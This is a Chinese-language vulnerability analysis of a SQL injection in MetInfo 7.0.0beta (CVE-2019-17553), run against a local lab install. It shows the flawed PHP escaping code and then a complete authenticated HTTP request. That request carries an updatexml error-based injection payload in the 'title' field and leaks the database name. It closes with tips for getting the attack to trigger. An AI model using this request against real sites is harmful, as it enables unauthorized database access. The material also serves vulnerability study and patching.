# MetInfo 7.0.0beta SQL注入(CVE-2019-17553)

## 简述

漏洞文件: 
1. /app/system/tags/admin/index.class.php
2. /app/system/include/function/common.func.php
3. /app/system/entrance.php

漏洞代码: 

```php
<?php
// /app/system/tags/admin/index.class.php
class index extends admin{
    ...
    public function doSaveTags(){
        if (!$id) {
            ...
        } else {
            ...
            $sql = get_sql($data);
            $query = "UPDATE {$_M['table']['tags']} SET {$sql} WHERE id = '{$id}'";
            ...
        }
    }
}

// /app/system/include/function/common.func.php
function get_sql($data)
{
    $sql = '';
    foreach ($data as $key => $value) {
        if (strstr($value, "'")) {
            $value = str_replace("'", "\'", $value);
        }
        $sql .= " {$key} = '{$value}',";
    }

    return trim($sql, ',');
}

// /app/system/entrance.php
define ('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
```

漏洞成因：框架自身的过滤函数与语言自身的过滤函数相互冲突。

## 触发过程
漏洞触发过程: 前端触发步骤没有找到。通过构造HTTP请求触发该漏洞

请求包
```text
POST /MetInfo7.0.0beta/admin/?n=tags&c=index&a=doSaveTags HTTP/1.1
Host: 127.0.0.1
Content-Length: 624
sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygA2sj1tBEM7eEbr1
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/MetInfo7.0.0beta/admin/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=2fe82753bbded869; DedeLoginTime=1677484864; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=146294035a82be1d; re_url=http%3A%2F%2F127.0.0.1%2FMetInfo7.0.0beta%2Fadmin%2F; PHPSESSID=7d1c94c770584d5d91a9a2373c17b16e; met_auth=d00dFbwptMLqVTXPjBGaN7%2FGfQvf%2BWx6LsOwzKUbh3ym1s6n7IX3k5kkIUo0OfnJfKB%2F4tKZaSrw5eXp%2FcNVAxC8Cg; met_key=bA5ImgB; page_iframe_url=http%3A%2F%2F127.0.0.1%2FMetInfo7.0.0beta%2Findex.php%3Flang%3Dcn%26pageset%3D1; Hm_lvt_520556228c0113270c0c772027905838=1677503633; arrlanguage=metinfo; admin_lang=cn; Hm_lpvt_520556228c0113270c0c772027905838=1677503984
Connection: close

------WebKitFormBoundarygA2sj1tBEM7eEbr1
Content-Disposition: form-data; name="tag_name"

22
------WebKitFormBoundarygA2sj1tBEM7eEbr1
Content-Disposition: form-data; name="keywords"

test
------WebKitFormBoundarygA2sj1tBEM7eEbr1
Content-Disposition: form-data; name="title"

test' and updatexml(1,concat(1,(database())),0)-- 123
------WebKitFormBoundarygA2sj1tBEM7eEbr1
Content-Disposition: form-data; name="description"

sss
------WebKitFormBoundarygA2sj1tBEM7eEbr1
Content-Disposition: form-data; name="module"

0
------WebKitFormBoundarygA2sj1tBEM7eEbr1
Content-Disposition: form-data; name="id"

1
```

响应包
```
HTTP/1.1 200 OK
Date: Mon, 27 Feb 2023 13:56:04 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
X-Powered-By: PHP/7.3.4
Connection: close
Content-Type: application/json; charset=utf-8
Content-Length: 66

{
    "msg": "XPATH syntax error: 'met700beta'",
    "status": 0
}
```
## 注意事项
post请求里面一定要让id有一个值，并且tag_name每次都需要改变成不同的值。
